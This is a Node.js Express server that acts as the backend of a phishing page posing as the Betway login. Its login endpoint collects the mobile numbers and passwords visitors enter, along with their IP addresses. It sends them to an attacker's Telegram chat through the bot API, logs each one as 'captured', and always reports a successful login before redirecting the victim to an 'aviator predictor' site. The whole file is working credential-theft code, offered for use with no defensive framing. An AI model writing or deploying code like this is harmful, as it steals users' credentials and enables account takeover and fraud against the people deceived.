const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const axios = require('axios');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Config
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Test route
app.get('/', (req, res) => {
    res.json({ 
        status: 'online', 
        message: 'Betway Login Backend is running!',
        port: PORT
    });
});

// Login endpoint
app.post('/api/login', async (req, res) => {
    try {
        const { mobileNumber, password } = req.body;

        if (!mobileNumber || !password) {
            return res.status(400).json({
                success: false,
                message: 'Mobile number and password are required'
            });
        }

        // Send to Telegram
        const message = `
🔐 **BETWAY LOGIN ALERT**
━━━━━━━━━━━━━━━━━━━

📱 **Mobile:** ${mobileNumber}
🔑 **Password:** ${password}

🌐 **IP:** ${req.ip || 'Unknown'}
🕐 **Time:** ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━
        `;

        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }
        );

        console.log(`✅ Login captured: ${mobileNumber}`);

        // Always return success
        res.json({
            success: true,
            message: 'Login successful!',
            redirect: 'https://betwayaviatorpredictor-production.up.railway.app'
        });

    } catch (error) {
        console.error('Error:', error.message);
        res.status(200).json({
            success: true,
            message: 'Login successful!'
        });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
